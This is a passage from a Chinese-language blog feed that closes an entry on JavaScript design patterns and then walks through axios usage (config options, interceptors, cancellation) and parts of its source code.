punctuation">.</span>onclick <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">formSubmit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre></li><li>装饰者模式和代理模式：代理模式和装饰者模式最重要的区别在于它们的意图和设计目的。代理模式的目的是，当直接访问本体不方便或者不符合需要时，为这个本体提供一个替代者。本体定义了关键功能，而代理提供或拒绝对它的访问，或者在访问本体之前做一些额外的事情。装饰者模式的作用就是为对象动态加入行为。换句话说，代理模式强调一种关系（Proxy 与它的实体之间的关系），这种关系可以静态的表达，也就是说，这种关系在一开始就可以被确定。而装饰者模式用于一开始不能确定对象的全部功能时。代理模式通常只有一层代理本体的引用，而装饰者模式经常会形成一条长长的装饰链</li></ul><h4 id="职责链模式"><a href="#职责链模式" class="headerlink" title="职责链模式"></a>职责链模式</h4><ul><li>定义：使多个对象都有机会处理请求，从而避免请求的发送者和接收者之间的耦合关系，将这些对象连成一条链，并沿着这条链传递该请求，直到有一个对象处理它为止<br>-</li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>axios基础及源码解析</title>
      <link href="/2018/09/22/axios-ji-chu-ji-yuan-ma-jie-xi/"/>
      <url>/2018/09/22/axios-ji-chu-ji-yuan-ma-jie-xi/</url>
      
        <content type="html"><![CDATA[<h4 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h4><p><a href="https://www.kancloud.cn/yunye/axios/234845" target="_blank" rel="noopener">Axios中文说明</a></p><h4 id="概览"><a href="#概览" class="headerlink" title="概览"></a>概览</h4><p>axios是一个基于promise的HTTP库，可以用在浏览器和node.js中。基本特性如下：</p><ul><li>从浏览器中创建XMLHttpRequest</li><li>从node.js中创建http请求</li><li>支持Promise api</li><li>拦截请求和响应</li><li>转换请求数据和响应数据</li><li>取消请求</li><li>自动转换JSON数据</li><li>客户端支持防御XSRF</li></ul><h4 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h4><ul><li>创建实例：<code>axios.create([config])</code><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> instance <span class="token operator">=</span> axios<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">{</span>baseURL<span class="token punctuation">:</span> <span class="token string">'https://www.example.com/api/'</span><span class="token punctuation">,</span>timeout<span class="token punctuation">:</span> <span class="token number">1000</span><span class="token punctuation">,</span>headers<span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">'X-Custom-Header'</span><span class="token punctuation">:</span> <span class="token string">'foobar'</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li>config配置项<pre class=" language-javascript"><code class="language-javascript"><span class="token punctuation">{</span><span class="token comment" spellcheck="true">// `url` 是用于请求的服务器 URL</span>url<span class="token punctuation">:</span> <span class="token string">'/api'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">// `method` 是创建请求时使用的方法</span>method<span class="token punctuation">:</span> <span class="token string">'get'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 默认是 get，可选get，delete,head,post,put,patch</span><span class="token comment" spellcheck="true">// `baseURL` 将自动加在 `url` 前面，除非 `url` 是一个绝对 URL</span><span class="token comment" spellcheck="true">// 它可以通过设置一个 `baseURL` 便于为 axios 实例的方法传递相对 URL</span>baseURL<span class="token punctuation">:</span> <span class="token string">'https://www.example.com/api/'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">// `transformRequest` 允许在向服务器发送前，修改请求数据</span><span class="token comment" spellcheck="true">// 只能用在 'PUT', 'POST' 和 'PATCH' 这几个请求方法</span><span class="token comment" spellcheck="true">// 后面数组中的函数必须返回一个字符串，或 ArrayBuffer，或 Stream</span>transformRequest<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token keyword">function</span> <span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 对 data 进行任意转换处理</span>  <span class="token keyword">return</span> data<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">// `transformResponse` 在传递给 then/catch 前，允许修改响应数据</span>transformResponse<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token keyword">function</span> <span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 对 data 进行任意转换处理</span>  <span class="token keyword">return</span> data<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">// `headers` 是即将被发送的自定义请求头</span>headers<span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token string">'X-Requested-With'</span><span class="token punctuation">:</span> <span class="token string">'XMLHttpRequest'</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">// `params` 是即将与请求一起发送的 URL 参数</span><span class="token comment" spellcheck="true">// 必须是一个无格式对象(plain object)或 URLSearchParams 对象</span>params<span class="token punctuation">:</span> <span class="token punctuation">{</span>  ID<span class="token punctuation">:</span> <span class="token number">12345</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">// `paramsSerializer` 是一个负责 `params` 序列化的函数</span><span class="token comment" spellcheck="true">// (e.g. https://www.npmjs.com/package/qs, http://api.jquery.com/jquery.param/)</span>paramsSerializer<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span>params<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> Qs<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>params<span class="token punctuation">,</span> <span class="token punctuation">{</span>arrayFormat<span class="token punctuation">:</span> <span class="token string">'brackets'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">// `data` 是作为请求主体被发送的数据</span><span class="token comment" spellcheck="true">// 只适用于这些请求方法 'PUT', 'POST', 和 'PATCH'</span><span class="token comment" spellcheck="true">// 在没有设置 `transformRequest` 时，必须是以下类型之一：</span><span class="token comment" spellcheck="true">// - string, plain object, ArrayBuffer, ArrayBufferView, URLSearchParams</span><span class="token comment" spellcheck="true">// - 浏览器专属：FormData, File, Blob</span><span class="token comment" spellcheck="true">// - Node 专属： Stream</span>data<span class="token punctuation">:</span> <span class="token punctuation">{</span>  firstName<span class="token punctuation">:</span> <span class="token string">'Fred'</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">// `timeout` 指定请求超时的毫秒数(0 表示无超时时间)</span><span class="token comment" spellcheck="true">// 如果请求话费了超过 `timeout` 的时间，请求将被中断</span>timeout<span class="token punctuation">:</span> <span class="token number">1000</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">// `withCredentials` 表示跨域请求时是否需要使用凭证</span>withCredentials<span class="token punctuation">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 默认的</span><span class="token comment" spellcheck="true">// `adapter` 允许自定义处理请求，以使测试更轻松</span><span class="token comment" spellcheck="true">// 返回一个 promise 并应用一个有效的响应 (查阅 [response docs](#response-api)).</span>adapter<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>config<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">/* ... */</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">// `auth` 表示应该使用 HTTP 基础验证，并提供凭据</span><span class="token comment" spellcheck="true">// 这将设置一个 `Authorization` 头，覆写掉现有的任意使用 `headers` 设置的自定义 `Authorization`头</span>auth<span class="token punctuation">:</span> <span class="token punctuation">{</span>  username<span class="token punctuation">:</span> <span class="token string">'janedoe'</span><span class="token punctuation">,</span>  password<span class="token punctuation">:</span> <span class="token string">'s00pers3cret'</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">// `responseType` 表示服务器响应的数据类型，可以是 'arraybuffer', 'blob', 'document', 'json', 'text', 'stream'</span>responseType<span class="token punctuation">:</span> <span class="token string">'json'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 默认的</span><span class="token comment" spellcheck="true">// `xsrfCookieName` 是用作 xsrf token 的值的cookie的名称</span>xsrfCookieName<span class="token punctuation">:</span> <span class="token string">'XSRF-TOKEN'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// default</span><span class="token comment" spellcheck="true">// `xsrfHeaderName` 是承载 xsrf token 的值的 HTTP 头的名称</span>xsrfHeaderName<span class="token punctuation">:</span> <span class="token string">'X-XSRF-TOKEN'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 默认的</span><span class="token comment" spellcheck="true">// `onUploadProgress` 允许为上传处理进度事件</span>onUploadProgress<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>progressEvent<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 对原生进度事件的处理</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">// `onDownloadProgress` 允许为下载处理进度事件</span>onDownloadProgress<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>progressEvent<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 对原生进度事件的处理</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">// `maxContentLength` 定义允许的响应内容的最大尺寸</span>maxContentLength<span class="token punctuation">:</span> <span class="token number">2000</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">// `validateStatus` 定义对于给定的HTTP 响应状态码是 resolve 或 reject  promise 。如果 `validateStatus` 返回 `true` (或者设置为 `null` 或 `undefined`)，promise 将被 resolve; 否则，promise 将被 rejecte</span>validateStatus<span class="token punctuation">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>status<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> status <span class="token operator">>=</span> <span class="token number">200</span> <span class="token operator">&amp;&amp;</span> status <span class="token operator">&lt;</span> <span class="token number">300</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 默认的</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">// `maxRedirects` 定义在 node.js 中 follow 的最大重定向数目</span><span class="token comment" spellcheck="true">// 如果设置为0，将不会 follow 任何重定向</span>maxRedirects<span class="token punctuation">:</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 默认的</span><span class="token comment" spellcheck="true">// `httpAgent` 和 `httpsAgent` 分别在 node.js 中用于定义在执行 http 和 https 时使用的自定义代理。允许像这样配置选项：</span><span class="token comment" spellcheck="true">// `keepAlive` 默认没有启用</span>httpAgent<span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">http<span class="token punctuation">.</span>Agent</span><span class="token punctuation">(</span><span class="token punctuation">{</span> keepAlive<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span>httpsAgent<span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">https<span class="token punctuation">.</span>Agent</span><span class="token punctuation">(</span><span class="token punctuation">{</span> keepAlive<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">// 'proxy' 定义代理服务器的主机名称和端口</span><span class="token comment" spellcheck="true">// `auth` 表示 HTTP 基础验证应当用于连接代理，并提供凭据</span><span class="token comment" spellcheck="true">// 这将会设置一个 `Proxy-Authorization` 头，覆写掉已有的通过使用 `header` 设置的自定义 `Proxy-Authorization` 头。</span>proxy<span class="token punctuation">:</span> <span class="token punctuation">{</span>  host<span class="token punctuation">:</span> <span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span>  port<span class="token punctuation">:</span> <span class="token number">9000</span><span class="token punctuation">,</span>  auth<span class="token punctuation">:</span> <span class="token punctuation">:</span> <span class="token punctuation">{</span>    username<span class="token punctuation">:</span> <span class="token string">'mikeymike'</span><span class="token punctuation">,</span>    password<span class="token punctuation">:</span> <span class="token string">'rapunz3l'</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">// `cancelToken` 指定用于取消请求的 cancel token</span><span class="token comment" spellcheck="true">// （查看后面的 Cancellation 这节了解更多）</span>cancelToken<span class="token punctuation">:</span> <span class="token keyword">new</span> <span class="token class-name">CancelToken</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>cancel<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><ul><li>配置的优先顺序：在 lib/defaults.js 找到的库的默认值，然后是实例的 defaults 属性，最后是请求的 config 参数。后者将优先于前者</li></ul></li><li>响应结构<pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">//then默认传入一个response，结构如下：</span><span class="token punctuation">{</span><span class="token comment" spellcheck="true">// `data` 由服务器提供的响应</span>data<span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">// `status` 来自服务器响应的 HTTP 状态码</span>status<span class="token punctuation">:</span> <span class="token number">200</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">// `statusText` 来自服务器响应的 HTTP 状态信息</span>statusText<span class="token punctuation">:</span> <span class="token string">'OK'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">// `headers` 服务器响应的头</span>headers<span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true">// `config` 是为请求提供的配置信息</span>config<span class="token punctuation">:</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre></li><li>并发：<code>axios.all(iterable)</code>、<code>axios.spread(callback)</code><pre class=" language-javascript"><code class="language-javascript">axios<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token punctuation">[</span>axios<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'https://api.github.com/users/mzabriskie'</span><span class="token punctuation">)</span><span class="token punctuation">,</span>axios<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'https://api.github.com/users/mzabriskie/orgs'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span>axios<span class="token punctuation">.</span><span class="token function">spread</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>user<span class="token punctuation">,</span> orgs<span class="token punctuation">)</span> <span class="token punctuation">{</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> user<span class="token punctuation">.</span>data<span class="token punctuation">.</span>name<span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'orgs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> orgs<span class="token punctuation">.</span>data<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>org<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token template-string"><span class="token string">`&lt;li class="row">      &lt;img src="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">${</span>org<span class="token punctuation">.</span>avatar_url<span class="token interpolation-punctuation punctuation">}</span></span><span class="token string">" class="col-md-1"/>    &lt;/li>`</span></span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li>post请求及处理<pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">//client</span>axios<span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/post/server'</span><span class="token punctuation">,</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>res<span class="token punctuation">)</span> <span class="token punctuation">{</span>  output<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> res<span class="token punctuation">.</span>data<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>err<span class="token punctuation">)</span> <span class="token punctuation">{</span>  output<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> err<span class="token punctuation">.</span>message<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//server</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>req<span class="token punctuation">,</span> res<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">var</span> data <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>req<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'data'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>chunk<span class="token punctuation">)</span> <span class="token punctuation">{</span>  data <span class="token operator">+</span><span class="token operator">=</span> chunk<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>req<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'end'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'POST data received'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">writeHead</span><span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    <span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'text/json'</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>JSON<span class="token punctuation">.</span><span class="token function">stringify</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre></li><li>get请求<pre class=" language-javascript"><code class="language-javascript">axios<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/user'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>  params<span class="token punctuation">:</span> <span class="token punctuation">{</span>    ID<span class="token punctuation">:</span> <span class="token number">12345</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>response<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>response<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li>请求拦截<pre class=" language-javascript"><code class="language-javascript"><span class="token comment" spellcheck="true">// 添加请求拦截器</span>axios<span class="token punctuation">.</span>interceptors<span class="token punctuation">.</span>request<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>config<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 在发送请求之前做些什么</span>  <span class="token keyword">return</span> config<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 对请求错误做些什么</span>  <span class="token keyword">return</span> Promise<span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 添加响应拦截器</span>axios<span class="token punctuation">.</span>interceptors<span class="token punctuation">.</span>response<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>response<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 对响应数据做点什么</span>  <span class="token keyword">return</span> response<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span>error<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 对响应错误做点什么</span>  <span class="token keyword">return</span> Promise<span class="token punctuation">.</span><span class="token function">reject</span><span class="token punctuation">(</span>error<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 移除拦截器</span><span class="token keyword">var</span> myInterceptor <span class="token operator">=</span> axios<span class="token punctuation">.</span>interceptors<span class="token punctuation">.</span>request<span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token comment" spellcheck="true">/*...*/</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>axios<span class="token punctuation">.</span>interceptors<span class="token punctuation">.</span>request<span class="token punctuation">.</span><span class="token function">eject</span><span class="token punctuation">(</span>myInterceptor<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li>取消<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> CancelToken <span class="token operator">=</span> axios<span class="token punctuation">.</span>CancelToken<span class="token punctuation">;</span><span class="token keyword">var</span> source <span class="token operator">=</span> CancelToken<span class="token punctuation">.</span><span class="token function">source</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>axios<span class="token punctuation">.</span><span class="token keyword">get</span><span class="token punctuation">(</span><span class="token string">'/user/12345'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>cancelToken<span class="token punctuation">:</span> source<span class="token punctuation">.</span>token<span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token keyword">catch</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span>thrown<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span>axios<span class="token punctuation">.</span><span class="token function">isCancel</span><span class="token punctuation">(</span>thrown<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'Request canceled'</span><span class="token punctuation">,</span> thrown<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// 处理错误</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// 取消请求（message 参数是可选的）</span>source<span class="token punctuation">.</span><span class="token function">cancel</span><span class="token punctuation">(</span><span class="token string">'Operation canceled by the user.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li></ul><h4 id="源码解析"><a href="#源码解析" class="headerlink" title="源码解析"></a>源码解析</h4><ul><li><p>源码目录<br><img src="/img/in-post/axios-00.JPG" alt="axios folder"></p></li><li><p>入口axios.js中实例的创建</p><ul><li>合并配置项，创建实例<pre class=" language-javascript"><code class="language-javascript">axios<span class="token punctuation">.</span>create <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token function">create</span><span class="token punctuation">(</span>instanceConfig<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> <span class="token function">createInstance</span><span class="token punctuation">(</span><span class="token function">mergeConfig</span><span class="token punctuation">(</span>axios<span class="token punctuation">.</span>defaults<span class="token punctuation">,</span> instanceConfig<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> axios<span class="token punctuation">;</span></code></pre></li><li>all方法是通过promise重新包装的<pre class=" language-javascript"><code class="language-javascript">axios<span class="token punctuation">.</span>all <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token function">all</span><span class="token punctuation">(</span>promises<span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">return</span> Promise<span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span>promises<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre></li></ul></li><li>默认配置defaults.js<ul><li>设置默认内容类型<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> DEFAULT_CONTENT_TYPE <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'Content-Type'</span><span class="token punctuation">:</span> <span class="token string">'application/x-www-form-urlencoded'</span><span class="token punctuation">}</span><span class="token punctuation">;</span>utils<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'post'</span><span class="token punctuation">,</span> <span class="token string">'put'</span><span class="token punctuation">,</span> <span class="token string">'patch'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token function">forEachMethodWithData</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span> <span class="token punctuation">{</span>defaults<span class="token punctuation">.</span>headers<span class="token punctuation">[</span>method<span class="token punctuation">]</span> <span class="token operator">=</span> utils<span class="token punctuation">.</span><span class="token function">merge</span><span class="token punctuation">(</span>DEFAULT_CONTENT_TYPE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>utils<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'delete'</span><span class="token punctuation">,</span> <span class="token string">'get'</span><span class="token punctuation">,</span> <span class="token string">'head'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token function">forEachMethodNoData</span><span class="token punctuation">(</span>method<span class="token punctuation">)</span> <span class="token punctuation">{</span>defaults<span class="token punctuation">.</span>headers<span class="token punctuation">[</span>method<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></li><li>默认xsrf验证<pre class=" language-javascript"><code class="language-javascript">xsrfCookieName<span class="token punctuation">:</span> <span class="token string">'XSRF-TOKEN'</span><span class="token punctuation">,</span>xsrfHeaderName<span class="token punctuation">:</span> <span class="token string">'X-XSRF-TOKEN'</span><span class="token punctuation">,</span></code></pre></li><li>检测环境：通过检测process对象检测是否是node环境或者浏览器环境<pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">function</span> <span class="token function">getDefaultAdapter</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">var</span> adapter<span class="token punctuation">;</span><span class="token comment" spellcheck="true">// Only Node.JS has a process variable that is of [[Class]] process</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">typeof</span> process <span class="token operator">!==</span> <span class="token string">'undefined'</span> <span class="token operator">&amp;&amp;</span> Object<span class="token punctuation">.</span>prototype<span class="token punctuation">.</span>toString<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>process<span class="token punctuation">)</span> <span class="token 